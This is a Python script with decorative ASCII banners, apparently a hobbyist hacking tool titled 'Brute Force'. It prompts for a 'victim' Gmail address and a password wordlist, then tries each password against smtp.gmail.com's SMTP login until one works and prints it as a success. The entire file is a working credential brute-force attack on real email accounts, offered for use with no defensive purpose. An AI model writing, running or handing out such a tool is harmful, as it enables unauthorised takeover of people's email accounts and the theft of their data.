import os
import time
import sys
import smtplib








def banner():
    print('\033[1;37;41m')
    print('''
        ,` -.)
       ( _/-\\-._            [DEAD]
      /,|`--._,-^|            ,
      \_| |`-._/||          , |
        |  `-, / |         /  /
        |     || |        /  /
         `r-._||/   __   /  /
     __,-<_     )`-/  `./  /
     \   `---    \   / /  /
        |           |./  /
        /           //  /
    \_/  \         |/  /
     |    |   _,^- /  /
     |    , ``  (\/  /_
      \,.->._    \X-=/^
      (  /   `-._//^
       `Y-.____(__} ''')

#############################################
#############################################
#############################################

def banner2():
     print('''\033[1;31;40m\n
                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''
           ''')  
print("\nWaiting for script kiddies to piss off.....\n")
time.sleep(3)
os.system("reset")
time.sleep(2)

WHITE = "\033[1;37;40m\n"
YELLOW = "\033[1;33;40m\n"
GREEN  = "\033[1;32;40m\n"
RED = "\033[1;31;40m\n"
BLUE  = "\033[1;34;40m\n"

print(YELLOW)
if os.geteuid() != 0:
        exit("You need to have root privileges to run It")

################################################################################

banner()
time.sleep(2)
os.system("reset")
print('''\033[1;33;40m
 ____  ____  _   _ _____ _____    _____ ___  ____   ____ _____
| __ )|  _ \| | | |_   _| ____|  |  ___/ _ \|  _ \ / ___| ____|
 |  _ \| |_) | | | | | | |  _|    | |_ | | | | |_) | |   |  _|
  | |_) |  _ <| |_| | | | | |___   |  _|| |_| |  _ <| |___| |___
   |____/|_| \_\\___/  |_| |_____|  |_|   \___/|_| \_\\____|_____|
   [127.0.0.1]                        [Coded by NorthX]
''')


time.sleep(2)

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print("\033[1;31;40m \n")
user = input("Enter victims mail $ ")
passwfile = input("Enter wordlist path $ ")
os.system("reset")
passwfile = open(passwfile, "r")
time.sleep(2)
os.system("figlet now the FUN P@RT")
time.sleep(3)

banner2()
for password in passwfile:
       try: 
                smtpserver.login(user, password)

                print(GREEN)
                print ("\033[1;37;40  [+] Victim F@ck3d  : %s " % (password) ) 
                break;
       except UnicodeEncodeError:
             print("Could not read the password file") 
       except smtplib.SMTPServerDisconnected:
                print(RED +"[!] ERROR" + WHITE + "Sever Disconnected...Try again ")
                exit() 
####################################################################################        
       except   smtplib.SMTPAuthenticationError:
                print(BLUE)
                print("\033[1;31;40m[!] \033[1;33;48mFAILED : %s  " % (password)) 
#####################################################################################       
       except KeyboardInterrupt:
                print(YELLOW + "\nCanceled by user") 
                exit()
